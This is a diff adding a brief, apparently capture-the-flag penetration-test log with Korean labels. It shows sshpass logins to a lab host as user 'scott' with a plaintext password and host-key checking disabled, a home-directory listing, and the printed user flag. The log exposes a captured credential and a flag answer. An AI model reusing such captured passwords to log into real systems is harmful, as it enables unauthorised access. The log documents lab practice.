@@ -1,0 +1,20 @@
+명령: sshpass -p 'iXzvcib3SrpZ' ssh -o StrictHostKeyChecking=no scott@10.129.244.177 'id; whoami; hostname'
+
+uid=1000(scott) gid=1001(scott) groups=1001(scott)
+scott
+abducted
+
+명령: sshpass -p 'iXzvcib3SrpZ' ssh -o StrictHostKeyChecking=no scott@10.129.244.177 'ls -la /home/scott; cat /home/scott/user.txt 2>&1'
+
+total 28
+drwxr-x--- 3 scott scott 4096 Jun  4 13:47 .
+drwxr-xr-x 4 root  root  4096 Jun  4 13:41 ..
+-rw------- 1 scott scott    0 Jun  4 13:47 .bash_history
+-rw-r--r-- 1 scott scott  220 Mar 31  2024 .bash_logout
+-rw-r--r-- 1 scott scott 3771 Mar 31  2024 .bashrc
+drwx------ 2 scott scott 4096 Jun  4 13:41 .cache
+-rw-r--r-- 1 scott scott  807 Mar 31  2024 .profile
+-rw-r----- 1 root  scott   33 Sep  6 01:05 user.txt
+340f70330e7e5bcdcda38b7556e664b6
+
+민감도: credential(scott 비밀번호는 loot 별도 기록), flag(user)
